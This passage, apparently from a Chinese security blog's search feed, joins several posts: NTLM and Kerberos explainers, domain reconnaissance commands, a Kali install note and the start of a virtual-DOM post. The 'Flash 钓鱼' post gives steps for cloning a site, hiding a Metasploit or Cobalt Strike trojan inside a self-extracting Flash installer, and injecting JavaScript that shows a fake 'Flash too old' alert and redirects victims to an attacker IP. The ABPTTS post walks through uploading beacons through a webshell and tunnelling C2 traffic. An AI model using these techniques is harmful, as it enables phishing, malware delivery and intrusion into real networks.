        <content type="html"><![CDATA[<h2 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h2><h3 id="NTLM简介"><a href="#NTLM简介" class="headerlink" title="NTLM简介"></a>NTLM简介</h3><p>NTLM使用在Windows NT和Windows 2000 Server（or later）工作组环境中（Kerberos用在域模式下）。在AD域环境中，如果需要认证Windows NT系统，也必须采用NTLM。较之Kerberos，基于NTLM的认证过程要简单很多。NTLM采用一种质询&#x2F;应答（Challenge&#x2F;Response）消息交换模式。<br>NTLM协议的认证， 包括 NTLMv1  和 NTLMv2 两个版本。  涉及到NTLM的认证全过程，以及NTLM 的 EPA（Extended Protection for Authentication）实现。<br>在本地登录Windows的情况下，操作系统会使用用户输入的密码作为凭证去与系统中的密码进行验证，操作系统中的密码存储在 <code>%SystemRoot%\system32\config\sam</code><br>当我们登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功。<br>这个SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。<br>Windows本身不保存明文密码，只保留密码的Hash。</p><p>ntlm认证大致流程:</p><p><strong>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</strong></p><p>关于NTLM Hash与NTLM<br>在Windows中，密码Hash目前称之为NTLM Hash，其中NTLM全称是：“NT LAN Manager”。<br>这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。<br>在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p><h3 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h3><p>NTLM是一种网络认证协议，它是基于挑战（Chalenge）&#x2F;响应（Response）认证机制的一种认证模式。<br>这个协议只支持Windows<br>NTLM协议的认证过程分为三步：</p><ol><li>协商</li><li>质询</li><li>验证</li></ol><p>协商：主要用于确认双方协议版本<br>质询：就是挑战（Chalenge）&#x2F;响应（Response）认证机制起作用的范畴。<br>验证：验证主要是在质询完成后，验证结果，是认证的最后一步。</p><p>质询的完整过程：</p><ol><li>客户端向服务器端发送用户信息(用户名)请求</li><li>服务器接受到请求，判断本地账户列 表是否有用户名，如果有，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1。生成一 个Net-NTLM Hash存在内存中，同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。</li><li>客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</li></ol><p>其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。<br>验证： 服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过。</p><h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><blockquote><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机&#x2F;服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址 的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、 修改和插入数据。在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的。</p></blockquote><p>Kerberos 协议中主要有三个角色:</p><ul><li>访问服务的 Client</li><li>提供服务的 Server</li><li>KDC(Key Distribution Center)密钥分发中心</li></ul><p><img src="https://i.loli.net/2021/11/02/cbhyQkTpjDRnUqv.png"><br>如图中显示的，步骤主要分三个来回认证步骤：</p><blockquote><p>K(c,tgs)：session_key(client与tgs之间的通信)<br>K(c,s)：session_key(client与server之间的通信)</p></blockquote><p>步骤一：Client –〉DC（KDC（as））；客户端向认证服务器（AS）发送一个认证请求（KRB_AS_REQ）。</p><blockquote><p>发送内容① ：[Pre-authentication data（client is ntlm_hash for Timestamp）,Client name &amp; realm（DomainName\Username）,Server Name（KDC TGS NAME）]</p></blockquote><p>步骤二：DC（KDC（as）） –〉Client ；认证服务器（AS）认证通过后（对比用户名是否在本地数据库中），给客户端发送加密后的Session Key和TGT凭证（KRB_AS_REP）。Session_key &#x3D; K(c,tgs)</p><blockquote><p>发送内容②：[Client_ntlm_hash(K(c,tgs))],[Krbtgt_ntlm_hash(k(c,tgs),Client_name(DomainName\Username),TGT_EndTime)]</p></blockquote><p>步骤三：Client –〉DC（KDC（tgs））；客户端拿着自己加密的Session_key和TGT凭证向票据生成服务器（TGS）发起一个认证请求（KRB_TGS_REQ）。</p><blockquote><p>发送内容③ ：[Session_key(Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）)],[TGT]</p></blockquote><p>步骤四：DC（KDC（tgs）） –〉Client ；票据生成服务器（TGS）认证通过后，给客户端发送加密后的Session_key和ticket票据（KRB_TGS_REP）。Session_key &#x3D; K(c,s)</p><blockquote><p>发送内容④ ：k(c,tgs)加密[Session_key],[Server_ntlm_hash(Tiket（K(c,s),Client_Name(domainName\Username),TGT_EndTime）)]</p></blockquote><p>步骤五：Client –〉Server ；客户端拿着自己加密的Session_key和ticket票据，去访问服务器（无双向认证的话，认证通过后， 即可访问，若双向认证，认证通过后继续走到步骤六）。</p><blockquote><p>发送内容⑤：K(c,s)加密[Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）],[Tiket]</p></blockquote><p>步骤六：Server–〉Client ；服务器认证通过后，放行，并且给客户端发送一个加密的Authenticator，用于让客户端识别是否访问正确的服务端。</p><blockquote><p>发送内容⑥：K(c,s)加密[Authenticator]</p></blockquote><p>相对于ntlm而言,kerberos的认证方式就要复杂的多,因为它提供了一个<strong>集中式</strong>的认证方式,在整个认证过程中总共要涉及到三方:客户端、服务端和KDC，<strong>在Windows域环境中,KDC的角色常常由DC(Domain Controller)来担任</strong>,Kerberos是一种<strong>基于票据的认证方式</strong>,票据(Ticket)是用来安全的在认证服务器和用户请求的服务之间传递用户的身份,同时也会传递一些附加信息,用来保证使用Ticket的用户必须是Ticket中指定的用户,<strong>Ticket一旦生成,在生存时间内可以被Client多次使用来申请同一个Server的服务(票据窃取问题)</strong><br><strong>注：这里面涉及到的一些名词缩写</strong></p><ul><li>KDC(Key Distribution Center):密钥分发中心，里面包含两个服务：AS和TGS</li><li>AS(Authentication Server):身份认证服务</li><li>TGT(Ticket Granting Ticket):由身份认证服务授予的票据**(黄金票据)**，用于身份认证，存储在内存</li><li>TGS(Ticket Granting Server):票据授予服务,<strong>该服务提供的票据也称为 TGS 或者叫白银票据</strong></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域控-信息收集</title>
      <link href="/posts/85d755d/"/>
      <url>/posts/85d755d/</url>
      
        <content type="html"><![CDATA[<h2 id="判断域"><a href="#判断域" class="headerlink" title="判断域"></a>判断域</h2><p><strong>命令汇总：</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net view /domain 查询域列表</span><br><span class="line">net time/domain 从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦用来判 断主域，主域一般用做时间服务器</span><br><span class="line">net localgroup administrators 本机管理员【通常含有域用户】</span><br><span class="line">net user /domain 查询域用户(当前域)</span><br><span class="line">net <span class="built_in">group</span> /domain 查询域工作组</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain 查看加入域的所有计算机名</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain 查询域管理员用户组和域管用户</span><br><span class="line">net localgroup administrators /domain 查看域管理员</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain 查看域控</span><br><span class="line">net accounts /domain 查看域密码策略</span><br></pre></td></tr></table></figure><h2 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h2><ul><li>通常域内主机 DNS 地址就是域控地址</li><li>查看是否开启 53(DNS)，88(kerberos)，389(LDAP) 等端口</li><li>ping 域控计算机名</li><li>利用nbtscan扫描识别，标注SHARING DC即为域控</li><li>域控计算机名可以通过3389信息，如用户切换时的提示查看</li><li>还可以通过smb嗅探<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:ak 查看域控制器的机器名</span><br><span class="line">Nslookup <span class="literal">-type</span>=SRV_ldap._tcp 查看域控制器的主机名</span><br><span class="line">net time /domain 查看当前时间，还可以看主域控</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Controllers&quot;</span> /domain 查看域控制器组</span><br><span class="line">netdom query pdc 查看域的主域控制器</span><br></pre></td></tr></table></figure>如果获得是一台不在域内的机器，可以通过端口扫描探测，开放389端口的机器，如果DC和DNS在同一个服务器也会开放53端口。<br><img src="https://i.loli.net/2021/09/16/wBqtOdP3TQRm6Ck.png" alt="image.png"></li></ul><h2 id="定位域管"><a href="#定位域管" class="headerlink" title="定位域管"></a>定位域管</h2><p>在域网络攻击测试中，获取域内的一个支点后，需要获取域管理员权限；定位域内管理员的常规渠道，一是日志，二是会话。<br>常见域管理员定位工具：</p><ul><li>psloggedon.exe</li><li>PVEFindADUser.exe</li><li>netview.exe</li><li>Nmap的NSE脚本</li><li>PowerView脚本</li><li>Empire的user_hunter模块</li></ul><p>简单方法：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain admins&quot;</span> /domain 查询域管理员用户</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Enterprise admins&quot;</span> /domain 查询管理员用户组</span><br></pre></td></tr></table></figure><h2 id="非域信息收集"><a href="#非域信息收集" class="headerlink" title="非域信息收集"></a>非域信息收集</h2><p>信息收集包括操作系统、权限、内网IP地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，那么操作系统、应用软件、补丁、服务、杀毒软件一般都是批量安装的。</p><ul><li>查询网络配置信息</li><li>查询操作系统及软件信息</li><li>查询本机服务信息</li></ul>]]></content>
      
      
      <categories>
          
          <category> 域 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域控 </tag>
            
            <tag> 域 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域控-概念</title>
      <link href="/posts/7dba0923/"/>
      <url>/posts/7dba0923/</url>
      
        <content type="html"><![CDATA[<h1 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h1><h2 id="域是什么"><a href="#域是什么" class="headerlink" title="域是什么"></a><strong>域是什么</strong></h2><blockquote><p>相关概念参考自“百度百科”</p></blockquote><p>在介绍windows的域之前，先说下<strong>工作组</strong>的概念。工作组是最常用最简单最普遍的资源管理模式。简单是因为默认情况下计算机都是采用工作组方式进行资源管理的。默认情况下我们个人所使用的电脑大部分都处在名为workgroup的工作组中（也就是说工作组中的每一台计算机在网络中地位平等，是独立管理的个体），工作组资源管理模式适合于网络中计算机不多，对管理要求不严格的情况。它的建立步骤简单，使用起来也很好上手。大部分中小公司都采取工作组的方式对资源进行权限分配和目录共享。也就是我们常在“网上邻居”看到的场景。<br>大多数人都使用过“网上邻居”做资源共享，但是这种工作组的形式，没有集中的统一帐户管理，没有对资源实施更加高效率的集中管理，没有实施工作站的有效配置和安全性严密控制（比如无法给所有机器统一发放补丁等）。基于以上缺点，当计算机数量比较多，大型企业中网络规模大，需要统一的管理和集中的身份验证，并且能够给用户提供方便的搜索和使用网络资源的方式，工作组的组织形式就不适合了，于是域就出现了。<br><strong>域</strong>是Windows计算机网络的一种形式，其中所有用户帐户 、计算机、打印机和其他安全主体都在位于称为域控制器（DC）的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行， 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配相应的该域内资源的访问权限。 从Windows Server 2003开始 ， Active Directory是负责维护该中央数据库的Windows组件。<br>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。 如果企业网络中计算机和用户数量较多时，要实现高效管理，就需要windows域。</p><h2 id="活动目录（AD）"><a href="#活动目录（AD）" class="headerlink" title="活动目录（AD）"></a>活动目录（AD）</h2><p><strong>活动目录（Active Directory）</strong>是由组织单元、域（domain）、域树（tree）、域森林（forest）构成的层次结构。<strong>域</strong>作为最基本的管理单元，同时也是最基层的容器。AD可以对域中所有的对象（用户，计算机，组……）等基本数据进行存储，并且让管理员和用户能够轻松地查找和使用这些信息。AD使用了一种结构化的数据存储方式,在一个活动目录中可以根据需要建立多个域.活动目录这种层次结构使企业网络具有极强的扩展性，便于组织、管理以及目录定位。</p><h2 id="域控（DC）"><a href="#域控（DC）" class="headerlink" title="域控（DC）"></a>域控（DC）</h2><p><strong>域控制器（Domain Control）</strong>在域架构中用来管理所有客户端的服务器，是域架构的核心，每个域控制器上都包含了AD活动目录数据库,即安装了AD的服务器就是域控DC。一般内网中存在多个域控，且域控之间可以自动同步信息，从而确保域的安全运行。</p><h2 id="域管"><a href="#域管" class="headerlink" title="域管"></a>域管</h2><p>域管理员是具有管理权限的域用户，它可以在域控中对在域主机进行统一控制。</p>]]></content>
      
      
      <categories>
          
          <category> 域 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域控 </tag>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flash 钓鱼</title>
      <link href="/posts/69bf394d/"/>
      <url>/posts/69bf394d/</url>
      
        <content type="html"><![CDATA[<blockquote><p>水一篇☔️</p></blockquote><ol><li><p>安装完整页面爬取工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># kali</span><br><span class="line">apt-get install httrack</span><br><span class="line"># yum install httrack –y</span><br></pre></td></tr></table></figure></li><li><p>运行httrack，爬取需要爬取的页面，按提示填写</p></li><li><p>去比对官网页面修改不一样的地方，使首页和目标一样</p></li><li><p>下载flash正常exe，生成相应木马如msf&#x2F;cs等</p></li><li><p>制作合成木马</p><ol><li>将两个木马放在同一个目录下</li><li>填写以exe结尾的文件名<img src="https://i.loli.net/2021/09/15/hADgpQo9v7EKmMT.png" alt="image.png"></li><li>点高级，进入自解压，填写解压绝对路径<img src="https://i.loli.net/2021/09/15/YdJI7hpLWfSm9NA.png" alt="image.png"></li><li>填写解压后的两个文件名<img src="https://i.loli.net/2021/09/15/OxdQ2IPTsuaDX1f.png" alt="image.png"></li><li>选择全部隐藏<img src="https://i.loli.net/2021/09/15/P7zt4fgok8KEIqh.png" alt="image.png"></li><li><img src="https://i.loli.net/2021/09/15/PICgvRpkDLZ6BU1.png" alt="image.png"></li></ol></li></ol><h3 id="flash结合xss"><a href="#flash结合xss" class="headerlink" title="flash结合xss"></a>flash结合xss</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">window.alert = function(name)&#123;</span><br><span class="line">var iframe = document.createElement(&quot;IFRAME&quot;);</span><br><span class="line">iframe.style.display=&quot;none&quot;;</span><br><span class="line">iframe.setAttribute(&quot;src&quot;,&#x27;data:text/plain,&#x27;);</span><br><span class="line">document.documentElement.appendChild(iframe);</span><br><span class="line">window.frames[0].window.alert(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">alert(&quot;您的FLASH版本过低，尝试升级后访问该页面! &quot;);</span><br><span class="line">window.location.href=&quot;http://192.168.0.110&quot;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 钓鱼 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼 </tag>
            
            <tag> flash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali 安装 Parallels Tools</title>
      <link href="/posts/eaed8b43/"/>
      <url>/posts/eaed8b43/</url>
      
        <content type="html"><![CDATA[<h1 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h1><p>本次安装中使用的配置信息：</p><ul><li>Parallels Desktop 17 17.0.0 (51461)</li><li><a href="https://cdimage.kali.org/kali-2021.2/kali-linux-2021.2-installer-amd64.iso">kali-linux-2021.2-installer-amd64.iso</a></li><li>Mac OS Big Sur 11.4(x86)</li><li>Kali KDE Plasma（其他安装选项均为默认）</li></ul><h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><p>Kali安装完成后进入系统，可以去选项选择安装Parallels Tools</p><p><img src="https://i.loli.net/2021/08/30/hY13bqzLS8T7tf6.png" alt="image-20210830104825322"></p><p>pd会提示确认按钮，点继续</p><p><img src="https://i.loli.net/2021/08/30/bhcy2ikgJrBeVPa.png" alt="image-20210830104927048"></p><p>kali会提示光盘挂载，这边就不使用命令行进行挂载了，直接点击即可</p><p><img src="https://i.loli.net/2021/08/30/lWexBKtMTdA5LqX.png" alt="image-20210830105026004"></p><p>然后将Parallels Tools内的东西找个文件夹复制进去，然后<code>root</code> 权限运行install</p><h2 id="解决Error"><a href="#解决Error" class="headerlink" title="解决Error"></a>解决Error</h2><p>一路点击next，会提示如下报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">An error occurred <span class="keyword">while</span> installing the following packages: </span><br><span class="line">        - linux-headers-5.10.0-kali7-amd64                          </span><br><span class="line">        - dkms                                                      </span><br><span class="line">        - printer-driver-postscript-hp                              </span><br><span class="line">                                                                    </span><br><span class="line">        Install these packages manually and start the Parallels     </span><br><span class="line">        Tools installation again.</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/30/PZCf7uGoAnLlMOj.png" alt="image-20210830110302771"></p><p>使用apt安装相关包会提示找不到</p><p><img src="https://i.loli.net/2021/08/30/CMoIVGacUReJ8DW.png" alt="image-20210830111113223"></p><p>接下来都需要手动安装，到这个网站<a href="https://http.kali.org/kali/pool/main/l/linux/%E4%B8%8B%E8%BD%BDlinux-headers-5.10.0-kali7-amd64">https://http.kali.org/kali/pool/main/l/linux/下载linux-headers-5.10.0-kali7-amd64</a></p><p><img src="https://i.loli.net/2021/08/30/1aquB9Vf8JYoGzx.png" alt="image-20210830111704591"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装deb包</span></span><br><span class="line">sudo dpkg -i package_file.deb</span><br></pre></td></tr></table></figure><p>安装提示报错，需要解决依赖项</p><p><img src="https://i.loli.net/2021/08/30/KNVIkeyzqMHvQTP.png" alt="image-20210830112215019"></p><p>现在去之前那个网站分别下载，并且安装</p><ul><li>linux-headers-5.10.0-kali7-common</li><li>linux-kbuild-5.10</li><li>linux-compiler-gcc-10-x86</li></ul><p><img src="https://i.loli.net/2021/08/30/QwzZI7yPWn58bJl.png" alt="image-20210830112712374"></p><p><img src="https://i.loli.net/2021/08/30/HiEUMAv1RNhPbaQ.png" alt="image-20210830112917707"></p><p><img src="https://i.loli.net/2021/08/30/wsdhxp3Lv59cnZ1.png" alt="image-20210830113021264"></p><p>三个依赖项安装成功，继续尝试安装linux-headers-5.10.0-kali7-amd64</p><p><img src="https://i.loli.net/2021/08/30/RwZSxmYXIluLG4O.png" alt="image-20210830113223948"></p><p>安装成功</p><p><img src="https://i.loli.net/2021/08/30/uB8cd7zIC6p9FX2.png" alt="image-20210830113330833"></p><p>继续安装之前的Parallels Tools，继续一路next，时间有点长耐心等待下</p><p>fuck，等的时间有点长，没选重启，直接成这了无语😓</p><p><img src="https://i.loli.net/2021/08/30/OpL4qyES1DdZlnx.png" alt="image-20210830115013364"></p><p>用提示无法解决这个问题，安装完本来也要重启，直接重启了，成功进入系统，尝试运行之前的安装程序已经提示安装成功。</p><p><img src="https://i.loli.net/2021/08/30/EftUKr2lo5AkQiO.png" alt="image-20210830123157051"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以后安装可能还会出现其他问题，基本都是提示缺少什么，你安装又会提示缺少一些依赖，总之就是装装装就行了。</p><p>其实就是少什么就去下面两个网站找，优先去第一个网站kali官方的，如果没有就去Debian的镜像站安装需要的东西（因为前两天装Parallels Tools有些依赖得去Debian的镜像站下载）。</p><p><strong>确认清楚需要安装的版本</strong> </p><ol><li><a href="https://http.kali.org/kali/pool/main/l/linux/">https://http.kali.org/kali/pool/main/l/linux/</a></li><li><a href="https://www.debian.org/mirror/">https://www.debian.org/mirror/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Mac </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透--ABPTTS正向代理cs上线</title>
      <link href="/posts/3ab59d7a/"/>
      <url>/posts/3ab59d7a/</url>
      
        <content type="html"><![CDATA[<h1 id="内网穿透–ABPTTS正向代理cs上线"><a href="#内网穿透–ABPTTS正向代理cs上线" class="headerlink" title="内网穿透–ABPTTS正向代理cs上线"></a>内网穿透–ABPTTS正向代理cs上线</h1><h2 id="内网穿透原理"><a href="#内网穿透原理" class="headerlink" title="内网穿透原理"></a>内网穿透原理</h2><p><strong>内网穿透是:利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</strong></p><blockquote><p>隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。</p></blockquote><p>我们进行内网渗透常用的隧道技术有dns隧道、http隧道、ssh隧道、icmp隧道等容易被网络防火墙放行的协议。</p><h2 id="内网穿透–应用层隧道工具"><a href="#内网穿透–应用层隧道工具" class="headerlink" title="内网穿透–应用层隧道工具"></a>内网穿透–应用层隧道工具</h2><p>由于应用层协议极多，对应的隧道工具也很多，我们常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等</p><p><a href="https://github.com/nccgroup/ABPTTS">ABPTTS</a></p><p>TCP over HTTP,即通过HTTP隧道转发TCP连接,数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2编写</span></span><br><span class="line">pip install httplib2</span><br><span class="line">pip install pycrypto</span><br></pre></td></tr></table></figure><h2 id="内网实战–利用ABPTTS上线不出网的主机至cs"><a href="#内网实战–利用ABPTTS上线不出网的主机至cs" class="headerlink" title="内网实战–利用ABPTTS上线不出网的主机至cs"></a>内网实战–利用ABPTTS上线不出网的主机至cs</h2><p><strong>实战背景：</strong>获取了webshell的主机位于内网，并且该内网主机icmp等网络层协议不能出网，tcp和udp等传输层协议不能出网，dns、http等应用层协议也不能出网，唯一的数据通道是反向代理入网的web应用。</p><p><strong>方案设计</strong>：利用反向代理入网的web应用所在的HTTP连接，构建正向的<code>TCP over HTTP</code>隧道。通过这条隧道，我们可以向内网主机发起tcp连接。生成bind类型的payload，通过webshell上传执行就会监听一个端口，我们的远控平台通过构建的<code>TCP over HTTP</code>隧道，去连接监听的端口即可上线。<br>能构建<code>TCP over HTTP</code>的隧道的工具有<code>ABPTTS、Tunna、reDuh</code>等，由于<code>Tunna、reDuh</code>构建的tcp连接不稳定，这里选用<code>ABPTTS</code>。</p><h3 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h3><p><strong>由于cobaltstrike的bind类型的监听器仅有beacon TCP和beacon SMB，并且都必须连接到父beacon，无法直接连接cobalstrike服务端，所以我们需要一个父beacon来中转连接。</strong></p><ol><li>生成server脚本</li></ol><p><code>python abpttsfactory.py -o server</code></p><p>上传到web并在client执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 abpttsclient.py -c server/config.txt -u <span class="string">&quot;http://xx.com/tyu.jsp&quot;</span> -f <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">4444</span>/<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">12344</span></span><br><span class="line"><span class="comment"># abptts客户端监听127.0.0.1:7777，通过http://192.168.168.121/abptts.aspx这个http隧道，将tcp连接127.0.0.1:7777转发到web服务器网络下的127.0.0.1:8888</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/25/vKbxtUHe8V496Ru.png" alt="image-20201105172524186.jpg">启动vps的cs server</p><p><code>./teamserver vpsip fuckbibi</code></p><ol start="2"><li>创建用来反向上线ab客户端的listener<img src="https://i.loli.net/2021/08/25/eW13sUMOYcXKioS.png" alt="image-20201105170031210.jpg"></li><li>生成父beacon<img src="https://i.loli.net/2021/08/25/cGYeORzNH4Cg5fX.png" alt="image-20201105170206527.jpg"></li><li>上传父beacon到ABPTTS客户端执行上线（其实就是上线你自己的攻击机）<img src="https://i.loli.net/2021/08/25/HvQhRNirxwmoDnk.png" alt="image-20201105170405974.jpg"></li><li>创建payload为tcp beacon的listener<img src="https://i.loli.net/2021/08/25/TBAgnRJfclXd9yP.png" alt="image-20201105170833874.jpg"></li><li>生成stageless的子beacon<img src="https://i.loli.net/2021/08/25/oPl1pCkRMynYiZ4.png" alt="image-20201105170943180.jpg"></li><li>将生成的子beacon通过webshell上传执行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 可以通过webshell查看网络监听，确保子beacon执行成功</span><br><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/08/25/vVRehkjSi7AMHQz.png" alt="image-20201105171346333.jpg"></li><li>在父beacon中连接abptts的监听ip和端口<br><code>connect 127.0.0.1:4444</code></li></ol><p><img src="https://i.loli.net/2021/08/25/5m14KRhPXbHykdt.png" alt="image-20201105174955855.jpg"></p><p><img src="https://i.loli.net/2021/08/25/P9Yo8gyBSlMtkEc.png" alt="image-20201105175021468.jpg"></p><p><img src="https://i.loli.net/2021/08/25/Rz7Dbvc9Aj1L6sB.png" alt="image-20201105175146916.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> CS </tag>
            
            <tag> 内网穿透 </tag>
            
            <tag> 正向代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>试着去理解虚拟DOM</title>
      <link href="/posts/bf933986/"/>
      <url>/posts/bf933986/</url>
      
        <content type="html"><![CDATA[<h2 id="去掉虚拟两个字，先了解下什么是DOM？"><a href="#去掉虚拟两个字，先了解下什么是DOM？" class="headerlink" title="去掉虚拟两个字，先了解下什么是DOM？"></a>去掉虚拟两个字，先了解下什么是DOM？</h2><blockquote><p>在原生JS中有DOM操作，就是使用浏览器提供的一些API，选中一个元素对它进行操作，比如说：增加一个属性、增加一个孩子、修改它里面的内容、改变它的位置，直接对DOM操作。这个DOM实际上对应的就是浏览器里面你所能看的见的对应的某个元素。</p></blockquote><h2 id="那什么是虚拟DOM"><a href="#那什么是虚拟DOM" class="headerlink" 